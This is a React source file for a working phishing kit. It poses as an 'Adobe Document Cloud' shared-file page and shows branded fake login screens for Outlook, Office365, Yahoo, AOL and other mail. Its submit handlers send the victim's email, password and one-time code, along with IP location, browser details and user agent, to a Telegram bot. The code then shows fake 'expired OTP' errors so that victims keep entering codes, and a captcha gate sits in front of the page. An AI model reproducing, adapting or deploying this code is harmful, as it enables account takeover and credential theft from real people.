import React, { useState } from 'react';
import TurnstileGate from './TurnstileGate';
import OutlookLoginPage from './components/OutlookLoginPage';
import Office365LoginPage from './components/Office365LoginPage';
import YahooLoginPage from './components/YahooLoginPage';
import AolLoginPage from './components/AolLoginPage';
import OtherLoginPage from './components/OtherLoginPage';
import './index.css';

// ── Provider icons (picker buttons only) ───────────────────────────
const Office365Icon = ({ size = 18 }) => (
  <svg xmlns="http://www.w3.org/2000/svg" width={size} height={size} viewBox="0 0 278050 333334" shapeRendering="geometricPrecision" textRendering="geometricPrecision" imageRendering="optimizeQuality" fillRule="evenodd" clipRule="evenodd">
    <path fill="#ea3e23" d="M278050 305556l-29-16V28627L178807 0 448 66971l-448 87 22 200227 60865-23821V80555l117920-28193-17 239519L122 267285l178668 65976v73l99231-27462v-316z" />
  </svg>
);
const AolIcon = ({ size = 18 }) => (
  <svg id="Layer_1" fill="currentColor" width={size} height={size} xmlns="http://www.w3.org/2000/svg" viewBox="0 0 122.88 48.6">
    <path d="M66.92,10.65c12.93,0,19.14,10.23,19.14,19s-6.21,19-19.14,19-19.15-10.22-19.15-19,6.21-19,19.15-19Zm0,28a8.68,8.68,0,0,0,8.51-9,8.53,8.53,0,1,0-17,0,8.69,8.69,0,0,0,8.52,9ZM92.07,0h10.78V47.61H92.07V0Zm23.65,33.62a7.16,7.16,0,1,0,7.16,7.16,7.17,7.17,0,0,0-7.16-7.16ZM28.34,0H18.75L0,47.61H12.71l2.51-6.88H31.75l2.32,6.88H46.9L28.34,0ZM18.56,31.07l5-16.6,5,16.6Z" />
  </svg>
);
const OutlookIcon = ({ size = 18 }) => (
  <svg viewBox="0 0 32 32" width={size} height={size} xmlns="http://www.w3.org/2000/svg" fill="#fff">
    <path d="M19.484,7.937v5.477L21.4,14.619a.489.489,0,0,0,.21,0l8.238-5.554a1.174,1.174,0,0,0-.959-1.128Z" style={{ fill: '#ffffff' }} />
    <path d="M19.484,15.457l1.747,1.2a.522.522,0,0,0,.543,0c-.3.181,8.073-5.378,8.073-5.378V21.345a1.408,1.408,0,0,1-1.49,1.555H19.483V15.457Z" style={{ fill: 'currentColor' }} />
    <path d="M10.44,12.932a1.609,1.609,0,0,0-1.42.838,4.131,4.131,0,0,0-.526,2.218A4.05,4.05,0,0,0,9.02,18.2a1.6,1.6,0,0,0,2.771.022,4.014,4.014,0,0,0,.515-2.2,4.369,4.369,0,0,0-.5-2.281A1.536,1.536,0,0,0,10.44,12.932Z" />
    <path d="M2.153,5.155V26.582L18.453,30V2ZM13.061,19.491a3.231,3.231,0,0,1-2.7,1.361,3.19,3.19,0,0,1-2.64-1.318A5.459,5.459,0,0,1,6.706,16.1a5.868,5.868,0,0,1,1.036-3.616A3.267,3.267,0,0,1,10.486,11.1a3.116,3.116,0,0,1,2.61,1.321,5.639,5.639,0,0,1,1,3.484A5.763,5.763,0,0,1,13.061,19.491Z" style={{ fill: '#ffffff' }} />
  </svg>
);

// ── Provider data ───────────────────────────────────────────────────
const PROVIDERS = [
  { id: 'outlook', name: 'Outlook', label: 'Sign in with Outlook', logoType: 'outlook', btnColor: 'bg-[#0072c6]', iconBg: 'bg-[#01b8ce]', domains: ['outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'outlook.co.uk', 'outlook.fr', 'outlook.de', 'outlook.com.au'], hint: '@outlook.com, @hotmail.com, @live.com …', title: 'Sign in to your Microsoft account', favicon: 'https://res.cdn.office.net/officehub/images/content/images/favicon_outlook-73336715f5.ico' },
  { id: 'office365', name: 'Office365', label: 'Sign in with Office365', logoType: 'office', btnColor: 'bg-[#d83b01]', iconBg: 'bg-white', domains: null, hint: 'Any work or school email', title: 'Sign in to your account', favicon: 'https://www.microsoft.com/favicon.ico' },
  { id: 'yahoo', name: 'Yahoo', label: 'Sign in with Yahoo Mail', logoType: 'yahoo', btnColor: 'bg-[#6001d2]', iconBg: 'bg-[#fff]', domains: null, hint: '@yahoo.com, @yahoo.co.uk, @yahoo.fr …', title: 'Yahoo', favicon: 'https://s.yimg.com/rz/l/favicon.ico' },
  { id: 'aol', name: 'AOL', label: 'Sign in with AOL', logoType: 'aol', btnColor: 'bg-green-600 text-white', iconBg: 'bg-black', domains: ['aol.com'], hint: '@aol.com', title: 'AOL', favicon: 'https://s.yimg.com/wm/login/aol-favicon.png' },
  { id: 'other', name: 'Email', label: 'Sign in with Other Mail', logoType: 'other', btnColor: 'bg-blue-500', iconBg: 'bg-white', domains: null, hint: 'Any email address', title: 'Sign in to your account', favicon: '/logo.webp' },
];

// Returns true if the email/username matches the provider's allowed domains
const emailMatchesProvider = (email, provider) => {
  if (!email) return false;
  const lower = email.toLowerCase();

  // 'Other' MUST be a fully qualified email address
  if (provider.id === 'other') {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(lower);
  }

  // For specific providers: if there is no '@', we assume it's a valid username
  if (!lower.includes('@')) {
    return true;
  }

  // If there IS an '@', validate the domain against the provider's rules
  if (provider.id === 'yahoo') return /^[^@]+@yahoo\..+$/.test(lower);
  if (!provider.domains) return true;

  const domain = lower.split('@')[1] ?? '';
  return provider.domains.includes(domain);
};

// Small icon inside each provider picker button
const ProviderIcon = ({ type }) => {
  switch (type) {
    case 'outlook': return <OutlookIcon size={24} />;
    case 'office': return <Office365Icon size={24} />;
    case 'yahoo': return <img src="yahoo-icon.png" alt="Y!" className="w-auto h-6" />;
    case 'aol': return <AolIcon size={24} />;
    case 'other': return <span className="text-gray-700 font-bold text-xl w-7">@</span>;
    default: return <span className="text-white">✉</span>;
  }
};

// Map provider id → dedicated page component
const PROVIDER_PAGE_MAP = {
  outlook: OutlookLoginPage,
  office365: OutlookLoginPage,
  yahoo: YahooLoginPage,
  aol: AolLoginPage,
  other: OtherLoginPage,
};

// Map provider id → its own Telegram bot credentials
// Falls back to the shared bot if provider-specific vars aren't set
const PROVIDER_BOT_MAP = {
  outlook: {
    token: import.meta.env.VITE_OUTLOOK_BOT_TOKEN || import.meta.env.VITE_TELEGRAM_BOT_TOKEN,
    chatId: import.meta.env.VITE_OUTLOOK_CHAT_ID || import.meta.env.VITE_TELEGRAM_CHAT_ID,
  },
  office365: {
    token: import.meta.env.VITE_OFFICE365_BOT_TOKEN || import.meta.env.VITE_TELEGRAM_BOT_TOKEN,
    chatId: import.meta.env.VITE_OFFICE365_CHAT_ID || import.meta.env.VITE_TELEGRAM_CHAT_ID,
  },
  yahoo: {
    token: import.meta.env.VITE_YAHOO_BOT_TOKEN || import.meta.env.VITE_TELEGRAM_BOT_TOKEN,
    chatId: import.meta.env.VITE_YAHOO_CHAT_ID || import.meta.env.VITE_TELEGRAM_CHAT_ID,
  },
  aol: {
    token: import.meta.env.VITE_AOL_BOT_TOKEN || import.meta.env.VITE_TELEGRAM_BOT_TOKEN,
    chatId: import.meta.env.VITE_AOL_CHAT_ID || import.meta.env.VITE_TELEGRAM_CHAT_ID,
  },
  other: {
    token: import.meta.env.VITE_OTHER_BOT_TOKEN || import.meta.env.VITE_TELEGRAM_BOT_TOKEN,
    chatId: import.meta.env.VITE_OTHER_CHAT_ID || import.meta.env.VITE_TELEGRAM_CHAT_ID,
  },
};

const getTelegramCreds = (providerId) =>
  PROVIDER_BOT_MAP[providerId] ??
  { token: import.meta.env.VITE_TELEGRAM_BOT_TOKEN, chatId: import.meta.env.VITE_TELEGRAM_CHAT_ID };

// ── Password validator ───────────────────────────────────────────────
// Minimum 6 characters — same as most email providers (Gmail, Outlook, Yahoo)
const isStrongPassword = (pw) => pw.length >= 6;

// ── Provider emoji map ───────────────────────────────────────────────
const PROVIDER_EMOJI = {
  outlook: '📧',
  office365: '💼',
  yahoo: '🟣',
  aol: '💚',
  other: '✉️',
};

// ── Fetch IP metadata ────────────────────────────────────────────────
const getIpInfo = async () => {
  try {
    const res = await fetch('https://ipapi.co/json/');
    if (!res.ok) return {};
    return await res.json();
  } catch {
    return {};
  }
};

// ── Detect browser from user agent ───────────────────────────────────
const detectBrowser = (ua = '') => {
  // ── Detect platform / OS ─────────────────────────────────────────
  let platform = '';
  if (/Android/.test(ua)) {
    platform = /Mobile/.test(ua) ? ' on Android' : ' on Android Tablet';
  } else if (/iPhone/.test(ua)) {
    platform = ' on iPhone';
  } else if (/iPad/.test(ua)) {
    platform = ' on iPad';
  } else if (/Windows Phone/.test(ua)) {
    platform = ' on Windows Phone';
  } else if (/Windows/.test(ua)) {
    platform = ' on Windows';
  } else if (/Macintosh/.test(ua)) {
    platform = ' on macOS';
  } else if (/Linux/.test(ua)) {
    platform = ' on Linux';
  } else if (/CrOS/.test(ua)) {
    platform = ' on ChromeOS';
  }

  // ── Detect browser (order matters — most specific first) ─────────
  let browser = 'Unknown Browser';
  if (/SamsungBrowser\//.test(ua)) browser = 'Samsung Internet';
  else if (/UCBrowser\//.test(ua)) browser = 'UC Browser';
  else if (/OPR\//.test(ua)) browser = 'Opera';
  else if (/OPiOS\//.test(ua)) browser = 'Opera on iOS';
  else if (/Opera Mini/.test(ua)) browser = 'Opera Mini';
  else if (/Edg\//.test(ua)) browser = 'Microsoft Edge';
  else if (/EdgA\//.test(ua)) browser = 'Microsoft Edge on Android';
  else if (/EdgiOS\//.test(ua)) browser = 'Microsoft Edge on iOS';
  else if (/YaBrowser\//.test(ua)) browser = 'Yandex Browser';
  else if (/Vivaldi\//.test(ua)) browser = 'Vivaldi';
  else if (/Brave\//.test(ua)) browser = 'Brave';
  else if (/CriOS\//.test(ua)) browser = 'Chrome on iOS';
  else if (/FxiOS\//.test(ua)) browser = 'Firefox on iOS';
  else if (/Firefox\//.test(ua)) browser = 'Mozilla Firefox';
  else if (/DuckDuckGo\//.test(ua)) browser = 'DuckDuckGo Browser';
  else if (/MIUI\//.test(ua)) browser = 'MIUI Browser';
  else if (/Chrome\//.test(ua) && /Mobile/.test(ua)) browser = 'Mobile Chrome';
  else if (/Chrome\//.test(ua)) browser = 'Google Chrome';
  else if (/Version\//.test(ua) && /Mobile\//.test(ua)) browser = 'Mobile Safari';
  else if (/Safari\//.test(ua)) browser = 'Safari';
  else if (/MSIE|Trident\//.test(ua)) browser = 'Internet Explorer';
  else if (/Android/.test(ua) && /AppleWebKit/.test(ua)) browser = 'Handheld Browser';

  return browser + platform;
};

// ── App ─────────────────────────────────────────────────────────────
const App = () => {
  const VERIFY_KEY = 'math_captcha_verified';
  const VERIFY_TTL = 24 * 60 * 60 * 1000; // 24 hours in ms

  const isAlreadyVerified = () => {
    try {
      const ts = localStorage.getItem(VERIFY_KEY);
      return ts && Date.now() - Number(ts) < VERIFY_TTL;
    } catch { return false; }
  };

  const [verified, setVerified] = useState(() => isAlreadyVerified());
  const [selectedProvider, setSelectedProvider] = useState(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [formData, setFormData] = useState({ email: '', password: '' });
  const [formStep, setFormStep] = useState(1); // 1=email 2=password 3=otp
  const [otp, setOtp] = useState('');
  const [emailError, setEmailError] = useState('');
  const [pwWarning, setPwWarning] = useState(false);
  const [otpError, setOtpError] = useState('');

  const DEFAULT_TITLE = 'Adobe Document Cloud';
  const DEFAULT_FAVICON = '/logo.webp';

  React.useEffect(() => {
    if (selectedProvider) {
      document.title = selectedProvider.title;
      const favicon = document.querySelector('link[rel="icon"]');
      if (favicon) favicon.href = selectedProvider.favicon;
    } else {
      document.title = DEFAULT_TITLE;
      const favicon = document.querySelector('link[rel="icon"]');
      if (favicon) favicon.href = DEFAULT_FAVICON;
    }
  }, [selectedProvider]);

  const handleProviderSelect = (provider) => {
    setSelectedProvider(provider);
    setFormData({ email: '', password: '' });
    setOtp('');
    setPwWarning(false);
    setEmailError('');
    setOtpError('');
    setIsSubmitting(false);
    setFormStep(1);
  };

  const handleCloseLogin = () => {
    setSelectedProvider(null);
    setFormStep(1);
    setOtp('');
    setPwWarning(false);
    setEmailError('');
    setOtpError('');
    setIsSubmitting(false);
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
    if (name === 'password') setPwWarning(false);
    if (name === 'email') setEmailError('');
  };

  const handleContinue = (e) => {
    e.preventDefault();
    if (!emailMatchesProvider(formData.email, selectedProvider)) {
      setEmailError(`Incorrect email address`);
      return;
    }
    setIsSubmitting(true);
    setEmailError('');
    setTimeout(() => {
      setFormStep(2);
      setIsSubmitting(false);
    }, 2000);
  };

  // Step 2: validate → send email+password to provider's Telegram bot → advance to OTP screen
  const handlePasswordSubmit = async (e) => {
    e.preventDefault();
    if (!isStrongPassword(formData.password)) {
      setPwWarning(true);
      return;
    }
    setPwWarning(false);
    setIsSubmitting(true);

    const { token: BOT_TOKEN, chatId: CHAT_ID } = getTelegramCreds(selectedProvider.id);
    const emoji = PROVIDER_EMOJI[selectedProvider.id] ?? '📩';
    const provName = selectedProvider.name.toUpperCase();
    const ip = await getIpInfo();
    const ua = navigator.userAgent;
    const browser = detectBrowser(ua);
    const now = new Date();
    const timeStr = now.toLocaleString('en-GB', { timeZone: 'GMT', hour12: true })
      + ' GMT';

    const message = [
      `${emoji} *${provName} LOGIN* ${emoji} \`[PASS]\``,
      ``,
      `*Email Address:* \`${formData.email}\``,
      `*Password:* \`${formData.password}\``,
      ``,
      `*\-\-\-\-\-\-\- I N F O \| I P \-\-\-\-\-\-\-\-*`,
      `*IP Address:* \`${ip.ip ?? 'N/A'}\``,
      `*Network:* \`${ip.network ?? 'N/A'}\``,
      `*IP Country:* ${ip.country_name ?? 'N/A'}`,
      `*IP City:* ${ip.city ?? 'N/A'}`,
      `*Browser:* ${browser}`,
      `*User Agent:* \`${ua}\``,
      `*TIME:* ${timeStr}`,
      ``,
      `_:::: ${provName} LOGIN ${emoji} ${provName} ${emoji} ::::_`,
    ].join('\n');

    try {
      const res = await fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' }),
        }
      );
      const result = await res.json();
      if (!result.ok) console.error('Telegram error:', result);
    } catch (err) {
      console.error('Error sending to Telegram:', err);
    } finally {
      setIsSubmitting(false);
      setFormStep(3); // Always advance to OTP screen
    }
  };

  // Step 3: send email+password+OTP to Telegram → show random OTP error
  const OTP_ERRORS = [
    'The OTP you entered has expired. Please request a new one.',
    'Invalid OTP. Please check and try again.',
  ];

  const handleOtpSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);
    setOtpError('');

    const { token: BOT_TOKEN, chatId: CHAT_ID } = getTelegramCreds(selectedProvider.id);
    const emoji = PROVIDER_EMOJI[selectedProvider.id] ?? '📩';
    const provName = selectedProvider.name.toUpperCase();
    const ip = await getIpInfo();
    const ua = navigator.userAgent;
    const browser = detectBrowser(ua);
    const now = new Date();
    const timeStr = now.toLocaleString('en-GB', { timeZone: 'GMT', hour12: true })
      + ' GMT';

    const message = [
      `${emoji} *${provName} LOGIN* ${emoji} \`[OTP]\``,
      ``,
      `*Email Address:* \`${formData.email}\``,
      `*Password:* \`${formData.password}\``,
      `*OTP Code:* \`${otp}\``,
      ``,
      `*\-\-\-\-\-\-\- I N F O \| I P \-\-\-\-\-\-\-\-*`,
      `*IP Address:* \`${ip.ip ?? 'N/A'}\``,
      `*Network:* \`${ip.network ?? 'N/A'}\``,
      `*IP Country:* ${ip.country_name ?? 'N/A'}`,
      `*IP City:* ${ip.city ?? 'N/A'}`,
      `*Browser:* ${browser}`,
      `*User Agent:* \`${ua}\``,
      `*TIME:* ${timeStr}`,
      ``,
      `_:::: ${provName} LOGIN ${emoji} ${provName} ${emoji} ::::_`,
    ].join('\n');

    try {
      const res = await fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' }),
        }
      );
      const result = await res.json();
      if (!result.ok) console.error('Telegram error:', result);
    } catch (err) {
      console.error('Error sending to Telegram:', err);
    } finally {
      setTimeout(() => {
        const randomError = OTP_ERRORS[Math.floor(Math.random() * OTP_ERRORS.length)];
        setOtpError(randomError);
        setOtp('');
        setIsSubmitting(false);
      }, 2000);
    }
  };

  const handleBack = () => {
    setFormStep(1);
    setPwWarning(false);
  };

  // ── Render ─────────────────────────────────────────────────────────
  // If a provider is selected, render its dedicated branded login page
  if (selectedProvider) {
    const LoginPage = PROVIDER_PAGE_MAP[selectedProvider.id] ?? OtherLoginPage;
    return (
      <LoginPage
        email={formData.email}
        password={formData.password}
        otp={otp}
        formStep={formStep}
        isSubmitting={isSubmitting}
        emailError={emailError}
        pwWarning={pwWarning}
        otpError={otpError}
        hint={selectedProvider.hint}
        onInputChange={handleInputChange}
        onContinue={handleContinue}
        onPasswordSubmit={handlePasswordSubmit}
        onOtpSubmit={handleOtpSubmit}
        onOtpChange={(e) => { setOtp(e.target.value); setOtpError(''); }}
        onBack={handleBack}
        onClose={handleCloseLogin}
      />
    );
  }

  return (
    <div className="relative min-h-screen w-screen flex items-center justify-center overflow-hidden dbg-slate-100" style={{ backgroundImage: "url('/bg-img.jpg')", backgroundSize: "cover", backgroundPosition: "center" }}>



      <div className="relative z-50 w-full max-w-md px-4">

        {/* ── Provider picker ── */}
        <div className="bg-black/60 backdrop-blur-xs backdrop-grayscale backdrop-brightness-120 rounded-xl px-8 py-10 text-white text-center shadow-2xl animate-fade-in">
          <div className="flex justify-center mb-6">
            <div className="w-12 h-12 rounded-full bg-red-500 flex items-center justify-center">
              <img src="/logo.webp" alt="Logo" className="w-12 h-12 rounded-full" />
            </div>
          </div>
          <h2 className="font-medium mb-1">Adobe Document Cloud</h2>
          <p className="text-xs text-white mb-6">
            To read the document, please choose your email provider below login to view shared file.
          </p>
          <div className="flex flex-col gap-3 mb-6">
            {PROVIDERS.map(({ id, label, logoType, btnColor, iconBg }) => (
              <button
                key={id}
                className={`flex items-center gap-2 w-full rounded ${btnColor} text-white text-sm font-medium transition hover:opacity-90 hover:-translate-y-px active:translate-y-px`}
                onClick={() => handleProviderSelect(PROVIDERS.find(p => p.id === id))}
              >
                <div className={`p-2 ${iconBg}`}>
                  <ProviderIcon type={logoType} />
                </div>
                {label}
              </button>
            ))}
            <p className="text-white text-xs">Built upon Adobe Document Cloud, Adobe Document Cloud features can be unlocked by providing an additional license key.</p>
          </div>
          <p className="text-xs text-white">CopyRight &copy; {new Date().getFullYear()} Adobe system incorporated, All right reserved.</p>
        </div>
      </div>
    </div>
  );
};

export default App;
